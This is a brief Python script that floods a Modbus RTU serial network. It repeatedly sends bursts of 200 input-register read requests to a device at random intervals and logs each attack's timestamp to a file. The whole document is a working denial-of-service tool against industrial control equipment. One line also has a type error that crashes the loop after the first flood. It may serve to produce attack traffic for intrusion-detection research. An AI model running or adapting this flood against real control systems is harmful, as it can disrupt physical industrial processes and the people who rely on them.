#!/usr/bin/env python

from pymodbus.client.sync import ModbusSerialClient as ModbusClient
import time
import random



def begin_flood():
    client = ModbusClient(method='rtu', port='/dev/ttyUSB0', timeout=20,stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
    client.connect()
    for i in range(200):
        client.read_input_registers(1, 21, unit=20)

    print("Modbus Network Flood Attempted - sent 200 packets \n")
    print("Time Stamp: " + time.time())
    with open("modbus_floods.txt", "a") as f:  # open the file in append mode
        f.write(str(time.time()) + "\n")  # write the current timestamp to the file then a new line
        


while True:
    # Generate a random interval between 30 seconds and 2 minutes
    random_interval = random.uniform(30, 120)
    print(f"Interval generated... Waiting {random_interval:.2f} seconds before running flood attack")
    time.sleep(random_interval)
    begin_flood()
